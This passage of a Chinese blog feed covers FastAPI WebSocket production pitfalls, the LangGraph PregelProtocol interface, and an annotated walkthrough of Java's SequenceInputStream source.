1);\">Sec-WebSocket-Protocol</code> 或者 Header 里的 <code style=\"color: rgba(186, 55, 42, 1);\">Authorization</code>。FastAPI 的依赖注入也支持 WebSocket，你可以写一个依赖来校验。</p>\n<pre class=\"language-python highlighter-hljs\"><code>from fastapi import WebSocket, WebSocketException, status\n\nasync def get_cookie_or_token(websocket: WebSocket):\n    # 从 query 参数或 header 取 token（示例从 query 取）\n    token = websocket.query_params.get(\"token\")\n    if token != \"secret\":\n        await websocket.close(code=status.WS_1008_POLICY_VIOLATION)\n        raise WebSocketException(\"认证失败\")\n    return token\n\n@app.websocket(\"/ws\")\nasync def websocket_endpoint(websocket: WebSocket, token: str = Depends(get_cookie_or_token)):\n    await websocket.accept()\n    # ...</code></pre>\n</div>\n\n<div style=\"margin: 25px 0;\">\n<p style=\"font-size: 18px; font-weight: 600;\">👉 3.3 连接数一高，服务就卡死？</p>\n<p>每个 WebSocket 连接都会占用一个系统文件描述符和内存。默认的 uvicorn 单进程能支撑的连接数有限（取决于你机器配置）。如果直接裸跑，内存可能会被慢慢吃光。</p>\n<p><strong style=\"color: rgba(186, 55, 42, 1);\">解决方案：</strong></p>\n<div style=\"margin-left: 15px;\">\n<p>🔹 用 <code style=\"color: rgba(186, 55, 42, 1);\">gunicorn + uvicorn workers</code> 启动多进程，注意设置适当的 worker 数量，一般 = CPU 核心数 * 2。</p>\n<p>🔹 如果广播消息频繁，不要用简单的全局循环给所有连接发，可以用 <code style=\"color: rgba(186, 55, 42, 1);\">asyncio.gather</code> 并发发送，但注意控制并发数，防止突发流量把 CPU 打满。</p>\n<p>🔹 考虑使用 Redis 等中间件做消息分发，特别是多进程模式下，一个进程不知道另一个进程管理的连接，需要借助外部广播。</p>\n</div>\n<p style=\"background-color: rgba(255, 243, 205, 1); padding: 10px; border-radius: 5px; margin-top: 15px;\">⚠️ 线上教训：我曾用单进程跑了 5000 个连接，结果内存占用 2GB，频繁 GC，最后用 <code style=\"color: rgba(186, 55, 42, 1);\">--workers 4</code> 解决了，但广播又成了新问题，后来引入了 Redis pub/sub。</p>\n</div>\n\n<div style=\"margin: 25px 0;\">\n<p style=\"font-size: 18px; font-weight: 600;\">👉 3.4 服务重启时，用户瞬间掉线怎么办？</p>\n<p>当你部署新版本，需要重启服务，所有 WebSocket 连接会被粗暴关闭。用户会看到“连接已断开”。这很不优雅。</p>\n<p><strong style=\"color: rgba(186, 55, 42, 1);\">解决方案：</strong> 利用 uvicorn 的 <code style=\"color: rgba(186, 55, 42, 1);\">lifespan</code> 事件，在关闭前主动通知客户端（比如发一条“服务即将维护”的消息），并等待几秒再关闭。也可以配合负载均衡的 draining 机制。</p>\n<pre class=\"language-python highlighter-hljs\"><code># 在 shutdown 事件里做清理\n@app.on_event(\"shutdown\")\nasync def shutdown_cleanup():\n    # 遍历所有活跃连接，发下线通知\n    for connection in active_connections:\n        try:\n            await connection.send_text(\"server going down, reconnect later\")\n        except:\n            pass\n    # 等 1 秒让消息发出去\n    await asyncio.sleep(1)</code></pre>\n</div>\n\n<div style=\"margin: 25px 0;\">\n<p style=\"font-size: 18px; font-weight: 600;\">👉 3.5 文本还是二进制？JSON 还是自定义？</p>\n<p>WebSocket 支持文本和二进制帧。如果你们前后端约定用 JSON，记得处理解析异常。我曾经因为前端发了个非法的 JSON，服务端没捕获 <code style=\"color: rgba(186, 55, 42, 1);\">json.JSONDecodeError</code>，直接导致连接崩溃。</p>\n<p><strong style=\"color: rgba(186, 55, 42, 1);\">稳健的做法：</strong> 统一用 <code style=\"color: rgba(186, 55, 42, 1);\">receive_json()</code> 并捕获异常，给客户端返回错误码，而不是断开连接。</p>\n</div>\n\n<h2 style=\"font-size: 22px; margin-top: 40px;\">🧠 4. 程序媛的碎碎念：从能用→好用→稳如泰山</h2>\n<p>WebSocket 的上手门槛确实低，但想在生产环境跑得稳，你需要考虑这些：</p>\n<div style=\"margin-left: 15px;\">\n<p>✅ 监控：每一条连接的存活时间、收发消息数量，最好都能通过 metrics 暴露出来（比如用 Prometheus）。</p>\n<p>✅ 限流：单个用户发消息太快怎么办？可以用漏桶或令牌桶限制频率，防止被恶意攻击。</p>\n<p>✅ 断线重连：客户端一定要有自动重连机制，指数退避策略，避免同时重连造成服务器压力。</p>\n<p>✅ 测试：用 <code style=\"color: rgba(186, 55, 42, 1);\">websockets</code> 库写脚本模拟数千个连接，压测一下你的服务，看资源占用和响应延迟。</p>\n</div>\n<p>我还记得有一次，我忘记设置 <code style=\"color: rgba(186, 55, 42, 1);\">max_size</code> 限制，客户端传了个超大的消息，直接把内存撑爆了。后来在 accept 之前加上 <code style=\"color: rgba(186, 55, 42, 1);\">websocket.max_size = 1_048_576</code> （1MB），世界又清净了。</p>\n<hr />\n<p style=\"font-size: 20px; font-weight: 500; text-align: center; margin: 30px 0;\">老朋友，今天的分享就到这里。如果你也在 FastAPI 里踩过 WebSocket 的坑，或者有什么独家秘笈，欢迎留言区切磋。</p>\n<p style=\"background-color: rgba(238, 242, 247, 1); padding: 20px; border-radius: 12px; text-align: center;\">⭐️ 觉得有用的话，<strong style=\"color: rgba(186, 55, 42, 1);\">点个赞</strong> 再走呗，这样我下回才有动力写出更多FastAPI 避坑指南。<br />当然，<strong style=\"color: rgba(186, 55, 42, 1);\">关注</strong>我也可以，毕竟你不知道我下次又会因为什么骚操作，给你带来新的实战经验～ 😉</p>\n</div>\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-02-15 13:13</span>&nbsp;\n<a href=\"https://www.cnblogs.com/ymtianyu\">一名程序媛呀</a>&nbsp;\n阅读(<span id=\"post_view_count\">43</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "[拆解LangChain执行引擎] PregelProtocol——定义了\"LangChain执行体\"最小功能集",
      "link": "https://www.cnblogs.com/jaydenai/p/19619278/pregel-protocol",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/jaydenai/p/19619278/pregel-protocol\" id=\"cb_post_title_url\" title=\"发布于 2026-02-16 07:22\">\n    <span>[拆解LangChain执行引擎] PregelProtocol——定义了\"LangChain执行体\"最小功能集</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                    <div id=\"cnblogs_post_description\" style=\"display: none;\">\n        \n        Pregel是对PregelProtocol协议的实现，后者的引入标志着 LangGraph 从一个单一的库进化为了一个可插拔的图计算框架。图可以视为“LangGraph 执行体”，而PregelProtocol定义了它必须具备的最小功能集合\n    </div>\n<div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<p>Pregel是对<code>PregelProtocol</code>协议的实现，后者的引入标志着 LangGraph 从一个单一的库进化为了一个可插拔的图计算框架。图可以视为“LangGraph 执行体”，而PregelProtocol定义了它必须具备的最小功能集合。我们从这协议的成员定义来看看这个功能集合包含哪些操作。</p>\n<h2 id=\"1-配置绑定\">1. 配置绑定</h2>\n<p>通过前面的内容我们会发现<code>RunnableConfig</code>这个对象几乎时无所不在，我们在调用Pregel对象的时候可以将它作为参数，用来提供用于控制其执行行为（比如迭代限制，并发控制等）的配置。执行引擎还将它作为容器用来下流流程传递一些组件和信号，所以前面的演示实例才可以在Node处理函数中从注入的RunnableConfig中提取像<code>Runtime</code>、<code>PregelScratchpad</code>、<code>Checkpoint命名空间</code>和<code>静态上下文</code>这样对象和信息。对于单纯Pregel的Node（不包括StateGraph的Node），RunnableConfig使唯一可以注入到处理函数中的参数，所以除了输入参数，其他所需的信息只能从它里面提取。</p>\n<p><code>with_config</code>方法赋予了这个 “执行体”与配置绑定的能力。除了提供RunnableConfig对象，我们还可以利用关键词参数提供待绑定的配置。由于RunnableConfig本质上就是一个TypedDict对象，提供的关键字参数组成的键值对可以直接转换成RunnableConfig对象。with_config方法会将两者合并，生成一个新的RunnableConfig对象绑定到执行体上。</p>\n<pre><code class=\"language-python\">class PregelProtocol(Runnable[InputT, Any], Generic[StateT, ContextT, InputT, OutputT]):\n    @abstractmethod\n    def with_config(\n        self, config: RunnableConfig | None = None, **kwargs: Any\n    ) -&gt; Self: ...\n</code></pre>\n<h2 id=\"2-可视化呈现\">2. 可视化呈现</h2>\n<p>PregelProtocol是LangGraph对 “图” 的抽象，这里的图是 “图论” 的概念，但是若真能将它的结构呈现在一张 “图片” 中，这无疑是非常有意义的。毕竟代码仅仅是面向程序员的语言，比不上图片，不但直观，还没有受众限制。LangGraph专门定义了如下这个Graph类型来表示面向 “可视化呈现” 的图。</p>\n<p>一个Graph对象标识的图依然由Node和Edge构成。它的每个Node都有一个唯一标识，我们可以调用<code>next_id</code>方法为下一个待添加的Node生成此标识。我们不仅可以调用<code>add_node</code>、<code>remove_node</code>和<code>add_edge</code>这样的方法以添加/移除Node和Edge来构建图，还可以调用<code>extend</code>方法将另一个Graph的所有Node和Edge添加进来。</p>\n<pre><code class=\"language-python\">@dataclass\nclass Graph:\n    nodes: dict[str, Node] = field(default_factory=dict)\n    edges: list[Edge] = field(default_factory=list)\n    \n    def next_id(self) -&gt; str\n    def add_node(\n        self,\n        data: type[BaseModel] | RunnableType | None,\n        id: str | None = None,\n        *,\n        metadata: dict[str, Any] | None = None,\n    ) -&gt; Node\n    def remove_node(self, node: Node) -&gt; None\n    def add_edge(\n        self,\n        source: Node,\n        target: Node,\n        data: Stringifiable | None = None,\n        conditional: bool = False,  # noqa: FBT001,FBT002\n    ) -&gt; Edge\n    def extend(\n        self, graph: Graph, *, prefix: str = \"\"\n    ) -&gt; tuple[Node | None, Node | None]:\n\n    def reid(self) -&gt; Graph:\n    def first_node(self) -&gt; Node | None\n    def last_node(self) -&gt; Node | None\n    def trim_first_node(self) -&gt; None\n    def trim_last_node(self) -&gt; None\n\n    def to_json(self, *, with_schemas: bool = False) -&gt; dict[str, list[dict[str, Any]]]\n    def draw_ascii(self) -&gt; str:\n    def print_ascii(self) -&gt; None:\n    @overload\n    def draw_png(\n        self,\n        output_file_path: str,\n        fontname: str | None = None,\n        labels: LabelsDict | None = None,\n    ) -&gt; None: ...\n    @overload\n    def draw_png(\n        self,\n        output_file_path: None,\n        fontname: str | None = None,\n        labels: LabelsDict | None = None,\n    ) -&gt; bytes: ...\n    def draw_png(\n        self,\n        output_file_path: str | None = None,\n        fontname: str | None = None,\n        labels: LabelsDict | None = None,\n    ) -&gt; bytes | None\n    def draw_mermaid(\n        self,\n        *,\n        with_styles: bool = True,\n        curve_style: CurveStyle = CurveStyle.LINEAR,\n        node_colors: NodeStyles | None = None,\n        wrap_label_n_words: int = 9,\n        frontmatter_config: dict[str, Any] | None = None,\n    ) -&gt; str\n    def draw_mermaid_png(\n        self,\n        *,\n        curve_style: CurveStyle = CurveStyle.LINEAR,\n        node_colors: NodeStyles | None = None,\n        wrap_label_n_words: int = 9,\n        output_file_path: str | None = None,\n        draw_method: MermaidDrawMethod = MermaidDrawMethod.API,\n        background_color: str = \"white\",\n        padding: int = 10,\n        max_retries: int = 1,\n        retry_delay: float = 1.0,\n        frontmatter_config: dict[str, Any] | None = None,\n        base_url: str | None = None,\n        proxies: dict[str, str] | None = None,\n    ) -&gt; bytes\n</code></pre>\n<p>调用<code>reid</code>方法可以返回一个新的Graph对象，它尽量保留途中可读性的元素，但是Node的ID会重新生成。Graph的<code>first_node</code>和<code>last_node</code>方法返回第一个和最后一个Node。如果我们希望删除第一个只有单一输出Edge或者最后一个只有单一输入Edge的Node，可以调用<code>trim_first_node</code>或者<code>trim_last_node</code>方法。</p>\n<p>构建好的Graph可以采用不同的呈现方式。Graph提供了五个“绘图”方法，其中<code>draw_ascii</code>和<code>print_ascii</code>采用ascii码字符的呈现方式，前者返回具体的ascii码字符串，后者则直接在终端将图绘制出来，这种方法不依赖其他的绘图相关的包。<code>draw_mermaid</code>和<code>draw_mermaid_png</code>采用Mermaid图表的呈现方式，Mermaid 是一种基于文本的流程图定义语言，广泛支持于 GitHub、Notion 和各种编辑器中。draw_mermaid返回图标文本，而<code>draw_mermaid_png</code>则直接将图表进一步渲染成PNG图片。Graph对象也可以通过调用<code>draw_png</code>方法渲染成PNG图片，该方法最终会Graphviz（一个开源的图可视化软件）来布局和渲染图片。</p>\n<p>再回到PregelProtocol类型的定义上，它定义了如下所示的<code>get_graph/aget_graph</code>方法，它们的返回类型DrawableGraph正是上述Graph类型的别名。该方法除了可以传入RunnableConfig对象作为可选配置外，还具有一个名为<code>xray</code>的参数。xray（X光）参数决定了你在查看图结构时，到底能看多深。它专门用于处理子图的展开显示。如果设置为False（默认值），图将以 “黑盒” 模式显式，如果你的图中包含子图，它只会显示为一个单一的节点。你看不见子图内部的任何节点、边或逻辑。反之将会采用 “全展开” 模式，它会像 X 光一样穿透所有层级，将所有嵌套子图内部的节点和连线全部平铺出来。</p>\n<pre><code class=\"language-python\">from langchain_core.runnables.graph import Graph as DrawableGraph\nclass PregelProtocol(Runnable[InputT, Any], Generic[StateT, ContextT, InputT, OutputT]):\n    @abstractmethod\n    def get_graph(\n        self,\n        config: RunnableConfig | None = None,\n        *,\n        xray: int | bool = False,\n    ) -&gt; DrawableGraph: ...\n\n    @abstractmethod\n    async def aget_graph(\n        self,\n        config: RunnableConfig | None = None,\n        *,\n        xray: int | bool = False,\n    ) -&gt; DrawableGraph: ...\n</code></pre>\n<p>在第一个演示实例中，我们创建了一个作为“笑话生成器”的Agent，现在我们将它简化，看看由它生成的Graph如何将图的结构以可视化的形式呈现出来。如下面的代码片段所示，我们利用StateGraph作为Builder，构建了一张由两个Node组成的图，它们和Start和End之间有四条边。</p>\n<pre><code class=\"language-python\">from langgraph.graph import StateGraph, START, END\nfrom langgraph.pregel.protocol import PregelProtocol\nfrom PIL import Image as PILImage\nimport io\nfrom langgraph.checkpoint.memory import MemorySaver\n\ndef generate_joke(state):\n    pass\n\ndef regenerate_joke(state):\n    pass\n\nbuilder = (\n    StateGraph(dict)\n    .add_node(\"generate_joke\", generate_joke)\n    .add_node(\"regenerate_joke\", regenerate_joke)\n)\n\nbuilder.add_edge(START, \"generate_joke\")\nbuilder.add_edge(\"regenerate_joke\", END)\nbuilder.add_conditional_edges(\n    \"generate_joke\", lambda _: \"bad\", {\"good\": END, \"bad\": \"regenerate_joke\"}\n)\n\napp: PregelProtocol = builder.compile(MemorySaver())\ngraph = app.get_graph()\ngraph.print_ascii()\n\nbytes = graph.draw_mermaid_png()\nPILImage.open(io.BytesIO(bytes)).show()\n</code></pre>\n<p>在将StateGraph编译成Pregel对象后，我们调用其get_graph方法得到对应的Graph对象。我们以两种形式呈现其结构，前者通过调用print_ascii方法以ASCII字符的形式输出图结构，后者调用draw_mermaid_png方法生成一张PNG图片。下图左右两部分分别展现了两种呈现方式的效果。</p>\n<h2 id=\"3-持久化\">3. 持久化</h2>\n<p>为了支持“中断/恢复”的执行方式，同时为“时间旅行”提供支持，图必须利用持久化的方式将执行过程的重要时刻的状态保存下来。LangGraph采用基于<code>Checkpoint</code>的持久化形式，对于指定的每个任务，不论是执行成功针对Channel的写入意图，还是抛出异常、人为中断或者Resume Value的提供，都会以Pending Write的形式被记录下来；当超步成功完成，针对Channel的写入被成功应用，这些Pending Write被丢弃，换来一个Checkpoint来描述当前的状态。</p>\n<p>作为“LangGraph 执行体”的抽象，PregelProtocol定义了<code>get_state/aget_state</code>方法用于读取在某个Superstep由Checkpoint（对于最后一个未完成的Superstep，还包括Pending Write）构建的状态快照，该快照体现为一个StateSnapshot对象。<code>get_state_history/aget_state_history</code>返回由这些快照谱写的一段历史。</p>\n<pre><code class=\"language-python\">class PregelProtocol(Runnable[InputT, Any], Generic[StateT, ContextT, InputT, OutputT]):\n    @abstractmethod\n    def get_state(\n        self, config: RunnableConfig, *, subgraphs: bool = False\n    ) -&gt; StateSnapshot: ...\n\n    @abstractmethod\n    async def aget_state(\n        self, config: RunnableConfig, *, subgraphs: bool = False\n    ) -&gt; StateSnapshot: ...\n\n    @abstractmethod\n    def get_state_history(\n        self,\n        config: RunnableConfig,\n        *,\n        filter: dict[str, Any] | None = None,\n        before: RunnableConfig | None = None,\n        limit: int | None = None,\n    ) -&gt; Iterator[StateSnapshot]: ...\n\n    @abstractmethod\n    def aget_state_history(\n        self,\n        config: RunnableConfig,\n        *,\n        filter: dict[str, Any] | None = None,\n        before: RunnableConfig | None = None,\n        limit: int | None = None,\n    ) -&gt; AsyncIterator[StateSnapshot]: ...\n\n    @abstractmethod\n    def bulk_update_state(\n        self,\n        config: RunnableConfig,\n        updates: Sequence[Sequence[StateUpdate]],\n    ) -&gt; RunnableConfig: ...\n\n    @abstractmethod\n    async def abulk_update_state(\n        self,\n        config: RunnableConfig,\n        updates: Sequence[Sequence[StateUpdate]],\n    ) -&gt; RunnableConfig: ...\n\n    @abstractmethod\n    def update_state(\n        self,\n        config: RunnableConfig,\n        values: dict[str, Any] | Any | None,\n        as_node: str | None = None,\n    ) -&gt; RunnableConfig: ...\n\n    @abstractmethod\n    async def aupdate_state(\n        self,\n        config: RunnableConfig,\n        values: dict[str, Any] | Any | None,\n        as_node: str | None = None,\n    ) -&gt; RunnableConfig: ...\n</code></pre>\n<p>持久化存储的Checkpoint不仅使我们可以回顾历史，还可以提供“时间旅行”，使我们可以从某个历史时刻重新执行后面的流程。不仅如此，PregelProtocol还提供了<code>update_state /bulk_update_state/abulk_update_state</code>可以直接修改状态。但是它们并非“篡改历史”，只是基于某个在某个历史时刻开启了另一段“平行宇宙”而已。持久化使LangGraph.Pregel作为核心和部分，我们将在后续部分对它进行专门的介绍。</p>\n<h2 id=\"4-两种调用方式\">4. 两种调用方式</h2>\n<p>PregelProtocol的<code>invoke/ainvoke</code>和<code>stream/astream</code>方法体现了针对 “LangGraph 执行体” 两种调用方式。前者采用简单的请求/回复消息交换模式，客户端需要等整个流程结束之后采用得到结果。如果整个处理流程比较复杂，或者涉及一些耗时的操作，过长的等待会带来糟糕的体验。后者采用流式处理使客户端可以实施得到处理的中间结果或者感知到处理的进度。我们将在后续部分对流式处理进行单独介绍。</p>\n<pre><code class=\"language-python\">class PregelProtocol(Runnable[InputT, Any], Generic[StateT, ContextT, InputT, OutputT]):\n    @abstractmethod\n    def stream(\n        self,\n        input: InputT | Command | None,\n        config: RunnableConfig | None = None,\n        *,\n        context: ContextT | None = None,\n        stream_mode: StreamMode | list[StreamMode] | None = None,\n        interrupt_before: All | Sequence[str] | None = None,\n        interrupt_after: All | Sequence[str] | None = None,\n        subgraphs: bool = False,\n    ) -&gt; Iterator[dict[str, Any] | Any]: ...\n\n    @abstractmethod\n    def astream(\n        self,\n        input: InputT | Command | None,\n        config: RunnableConfig | None = None,\n        *,\n        context: ContextT | None = None,\n        stream_mode: StreamMode | list[StreamMode] | None = None,\n        interrupt_before: All | Sequence[str] | None = None,\n        interrupt_after: All | Sequence[str] | None = None,\n        subgraphs: bool = False,\n    ) -&gt; AsyncIterator[dict[str, Any] | Any]: ...\n\n    @abstractmethod\n    def invoke(\n        self,\n        input: InputT | Command | None,\n        config: RunnableConfig | None = None,\n        *,\n        context: ContextT | None = None,\n        interrupt_before: All | Sequence[str] | None = None,\n        interrupt_after: All | Sequence[str] | None = None,\n    ) -&gt; dict[str, Any] | Any: ...\n\n    @abstractmethod\n    async def ainvoke(\n        self,\n        input: InputT | Command | None,\n        config: RunnableConfig | None = None,\n        *,\n        context: ContextT | None = None,\n        interrupt_before: All | Sequence[str] | None = None,\n        interrupt_after: All | Sequence[str] | None = None,\n    ) -&gt; dict[str, Any] | Any: ...\n</code></pre>\n<p>执行体支持中断/恢复（interrupt/resume）的方式执行，所以在中断时需要将当时的状态以 “Checkpoint（Checkpoint）” 的形式保存下来，恢复执行的时候利用它们将当时的 “执行线程” 复原。Checkpointing的机制也使 “时间旅行” 成为可能，我们可以从任一Checkpoint开始执行。也正是因为此持久化机制的存在，我们可以提取某一个Superstep的状态，还可以查看整个执行历史，这两个功能分别对应PregelProtocol的<code>get_state/aget_state</code>和<code>get_state_history/aget_state_history</code>方法。具体的状态以StateSnapshot对象描述的快照表示。</p>\n<p>执行体应该具有将执行结果作为新的状态进行保存的能力，所以PregelProtocol定义了<code>update_state/aupdate_state</code>和<code>bulk_update_state/abulk_update_state</code>方法，前者保存单一状态更新，后者对多个状态更新进行批量执行。单一状态更新通过如下这个名为StateUpdate的命名元组表示，我们不仅可以利用values字段得到以字典形式表示的状态值，还可以通过<code>as_node</code>和<code>task_id</code>字段的得到实施更新的Node和具体任务标识。</p>\n<pre><code class=\"language-python\">class StateUpdate(NamedTuple):\n    values: dict[str, Any] | None\n    as_node: str | None = None\n    task_id: str | None = None\n</code></pre>\n<p>执行体支持两种基本的操作，一种采用单纯的请求/响应消息交换模式，另一种以流的形式实时返回数据，它们分别对应<code>invoke/ainvoke</code>和<code>stream/astream</code>方法。</p>\n<h2 id=\"5-嵌套结构\">5. 嵌套结构</h2>\n<p>我们一直在强调图的“嵌套”结构，这种结构也可以从Pregel、PregelNode和PregelProtocol在三个类型的定义。一个Pregel是PregelProtocol的实现、作为其节点的PregelNode对象可以由一个或者多个PregelProtocol组成，对于表示 “子图” 的subgraphs字段，并且该字段返回一个PregelProtocol对象的序列。Pregel的subgraphs方法返回的子图就来源于组成它的Node。</p>\n<pre><code class=\"language-python\">class PregelNode:\n    subgraphs\t: Sequence[PregelProtocol]\n\nclass Pregel(\n    PregelProtocol[StateT, ContextT, InputT, OutputT],\n    Generic[StateT, ContextT, InputT, OutputT]):\n    def get_subgraphs(\n        self, *, namespace: str | None = None, recurse: bool = False\n    ) -&gt; Iterator[tuple[str, PregelProtocol]]\n\n    async def aget_subgraphs(\n        self, *, namespace: str | None = None, recurse: bool = False\n    ) -&gt; AsyncIterator[tuple[str, PregelProtocol]]\n</code></pre>\n<p>PregelNode的subgraphs字段提供了 “子图” 的静态注册，其实任何一个Pregel对象都可以在无需注册前提下被另一个Pregel的Node调用，而且反映当前执行上下文的一些执行配置会通过上下文变量（ContenxtVars） “流向” 作为子图的Pregel对象。前面我们演示子图调用涉及的Checkpoint命名空间的例子已经充分体现了这一点。但是这种显式的静态声明对于图的静态图分析与可视化有着积极的作用。</p>\n\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-02-16 07:22</span>&nbsp;\n<a href=\"https://www.cnblogs.com/jaydenai\">JaydenAI</a>&nbsp;\n阅读(<span id=\"post_view_count\">12</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "8、SequenceInputStream的源码和Vector.class的一些函数说明（windows操作系统，JDK8）",
      "link": "https://www.cnblogs.com/Carey-ccl/p/19618752",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/Carey-ccl/p/19618752\" id=\"cb_post_title_url\" title=\"发布于 2026-02-15 22:25\">\n    <span>8、SequenceInputStream的源码和Vector.class的一些函数说明（windows操作系统，JDK8）</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<h4 id=\"一sequenceinputstream源码可以顺序读取多个输入stream的装饰器类\">一、SequenceInputStream源码——可以顺序读取多个输入Stream的装饰器类</h4>\n<p>  SequenceInputStream.class 的UML关系图，如下所示：<br />\n<img alt=\"clipboard\" class=\"lazyload\" /></p>\n<p>  SequenceInputStream.class的源码，如下所示：</p>\n<pre><code>package java.io;\nimport java.io.InputStream;\nimport java.util.Enumeration;\nimport java.util.Vector;\n\npublic\nclass SequenceInputStream extends InputStream {\n    //顺序（序列化）装载多个被装饰输入Stream的集合，一般是Vector实例\n    Enumeration&lt;? extends InputStream&gt; e;\n    InputStream in;//顺序（序列化）装载多个被装饰输入Stream的集合中当前正在被SequenceInputStream 对象使用的被装饰的输入Stream\n    \n    //构造函数，传入一个顺序（序列化）装载多个被装饰输入Stream的集合\n    public SequenceInputStream(Enumeration&lt;? extends InputStream&gt; e) {\n        this.e = e;\n        try {\n            nextStream();\n        } catch (IOException ex) {\n            // This should never happen\n            throw new Error(\"panic\");\n        }\n    }\n    \n    //构造函数，可以将2个被装饰的输入Stream放入到集合中\n    public SequenceInputStream(InputStream s1, InputStream s2) {\n        Vector&lt;InputStream&gt; v = new Vector&lt;&gt;(2);\n\n        v.addElement(s1);\n        v.addElement(s2);\n        e = v.elements();\n        try {\n            nextStream();\n        } catch (IOException ex) {\n            // This should never happen\n            throw new Error(\"panic\");\n        }\n    }\n    //获取集合中下一个被装饰的输入Stream\n    final void nextStream() throws IOException {\n        if (in != null) {\n            in.close();//先关闭当前被装饰的输入Stream\n        }\n\n        if (e.hasMoreElements()) {//如果集合中还有被装饰的输入Stream\n            in = (InputStream) e.nextElement();//获取集合中下一个被装饰的输入Stream\n            if (in == null)\n                throw new NullPointerException();//如果集合中下一个被装饰的输入Stream为null，抛出一个NullPointerException\n        }\n        else in = null;//如果集合中没有了被装饰的输入Stream，将当前正在使用的被装饰的输入Stream置为null\n\n    }\n    \n    //判断当前正在使用的被装饰的输入Stream是否还有可以读取的字节数据\n    public int available() throws IOException {\n        if (in == null) {\n            return 0; // no way to signal EOF from available()\n        }\n        return in.available();\n    }\n    \n    //从SequenceInputStream 对象的集合（该集合放着多个被装饰的输入Stream）中读取1个字节\n    public int read() throws IOException {\n        while (in != null) {//如果in!=null，则说明当前这个SequenceInputStream 对象的集合中还有被装饰的输入Stream没有关闭\n            int c = in.read();//从当前正在使用的被装饰的被装饰输入Stream中读取1个字节\n            if (c != -1) {//c != -1说明从当前正在使用的被装饰输入Stream中读取到了字节\n                return c;//返回读取到的这个字节\n            }\n            nextStream();//如果c==-1说明当前正在使用的被装饰输入Stream中字节（byte）数据已经读完，获取SequenceInputStream 对象的集合中下一个被装饰的输入Stream\n        }\n        return -1;//如果SequenceInputStream 对象的集合中所有被装饰的输入Stream中的字节（byte）数据都已经读完，返回-1\n    }\n\n    //从SequenceInputStream 对象的集合（该集合放着多个被装饰的输入Stream）中读取len个字节，放入到byte[]数组b的[off,off+len)（左闭右开，不包括off+len）索引位置\n    public int read(byte b[], int off, int len) throws IOException {\n        if (in == null) {//如果in==null，则说明当前这个SequenceInputStream 对象的集合中所有被装饰的输入Stream都已经关闭\n            return -1;\n        } else if (b == null) {\n            throw new NullPointerException();//如果byte[]数组b==null，抛出一个NullPointerException\n        } else if (off &lt; 0 || len &lt; 0 || len &gt; b.length - off) {//相当于off + len &gt; b.length（源码中这样写代码的好处我没看出来）\n            throw new IndexOutOfBoundsException();\n        } else if (len == 0) {\n            return 0;//要从SequenceInputStream 对象的集合（该集合放着至少2个被装饰的输入Stream）中读取的len个字节==0时，返回0\n        }\n        do {\n            int n = in.read(b, off, len);//从当前正在使用的被装饰的输入Stream中读取len个字节，放入到byte[]数组b的[off,off+len)（左闭右开，不包括off+len）索引位置\n            if (n &gt; 0) {\n                return n;//只要能从当前正在使用的被装饰的输入Stream中读取到字节，则返回读取的数量\n            }\n            nextStream();//此时n==-1，说明当前正在使用的被装饰的输入Stream中字节（byte）数据已经读完，获取SequenceInputStream 对象的集合中下一个被装饰的输入Stream\n        } while (in != null);//SequenceInputStream 对象的集合中下一个被装饰的输入Stream为null时，跳出循环，返回-1\n        return -1;\n    }\n    //顺序关闭SequenceInputStream 对象的集合中所有被装饰的输入Stream\n    public void close() throws IOException {\n        do {\n            nextStream();\n        } while (in != null);\n    }\n}\n</code></pre>\n<h5 id=\"11sequenceinputstream的read函数和nextstream函数\">1.1、SequenceInputStream的read()函数和nextStream()函数</h5>\n<pre><code>package java.io;\nimport java.io.InputStream;\nimport java.util.Enumeration;\nimport java.util.Vector;\n\npublic\nclass SequenceInputStream extends InputStream {\n    ...省略部分代码...\n    //顺序（序列化）存储多个被装饰的输入Stream的集合，一般是Vector实例\n    Enumeration&lt;? extends InputStream&gt; e;\n    InputStream in;//顺序（序列化）装载多个被装饰输入Stream的集合中当前正在被SequenceInputStream 对象使用的被装饰的输入Stream\n    //获取集合中下一个被装饰的输入Stream\n    final void nextStream() throws IOException {\n        if (in != null) {\n            in.close();//先关闭当前被装饰的输入Stream\n        }\n\n        if (e.hasMoreElements()) {//如果集合中还有被装饰的输入Stream\n            in = (InputStream) e.nextElement();//获取集合中下一个被装饰的输入Stream\n            if (in == null)\n                throw new NullPointerException();//如果集合中下一个被装饰的输入Stream为null，抛出一个NullPointerException\n        }\n        else in = null;//如果集合中没有了被装饰的输入Stream，将当前正在使用的被装饰的输入Stream置为null\n\n    }\n    \n    //从SequenceInputStream 对象的集合（该集合放着多个被装饰的输入Stream）中读取1个字节\n    public int read() throws IOException {\n        while (in != null) {//如果in!=null，则说明当前这个SequenceInputStream 对象的集合中还有被装饰的输入Stream没有关闭\n            int c = in.read();//从当前正在使用的被装饰的被装饰输入Stream中读取1个字节\n            if (c != -1) {//c != -1说明从当前正在使用的被装饰输入Stream中读取到了字节\n                return c;//返回读取到的这个字节\n            }\n            nextStream();//如果c==-1说明当前正在使用的被装饰输入Stream中字节（byte）数据已经读完，获取SequenceInputStream 对象的集合中下一个被装饰的输入Stream\n        }\n        return -1;//如果SequenceInputStream 对象的集合中所有被装饰的输入Stream中的字节（byte）数据都已经读完，返回-1\n    }\n    